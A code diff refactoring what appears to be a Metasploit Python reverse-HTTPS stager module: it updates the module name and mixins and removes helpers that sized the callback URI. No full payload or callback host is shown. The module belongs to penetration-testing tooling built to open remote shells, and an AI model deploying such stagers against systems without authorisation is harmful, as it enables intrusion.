+++ modules/payloads/stagers/python/reverse_https.rb
@@ -5,14 +5,14 @@
 
 require 'msf/core'
 require 'msf/core/handler/reverse_https'
-require 'msf/core/payload/uuid/options'
+require 'msf/core/payload/python/reverse_http'
 
-module Metasploit3
+module Metasploit4
 
   CachedSize = 762
 
   include Msf::Payload::Stager
-  include Msf::Payload::UUID::Options
+  include Msf::Payload::Python::ReverseHttp
 
   def initialize(info = {})
     super(merge_info(info,
@@ -91,37 +91,6 @@ module Metasploit3
     b64_stub << Rex::Text.encode_base64(cmd)
     b64_stub << "')))"
     return b64_stub
-  end
-
-  #
-  # Determine the maximum amount of space required for the features requested
-  #
-  def required_space
-    # Start with our cached default generated size
-    space = cached_size
-
-    # Add 100 bytes for the encoder to have some room
-    space += 100
-
-    # Make room for the maximum possible URL length
-    space += 256
-
-    # The final estimated size
-    space
-  end
-
-  #
-  # Return the longest URL that fits into our available space
-  #
-  def generate_callback_uri
-    uri_req_len = 30 + rand(256-30)
-
-    # Generate the short default URL if we don't have enough space
-    if self.available_space.nil? || required_space > self.available_space
-      uri_req_len = 5
-    end
-
-    generate_uri_uuid_mode(:init_python, uri_req_len)
   end
 
 end
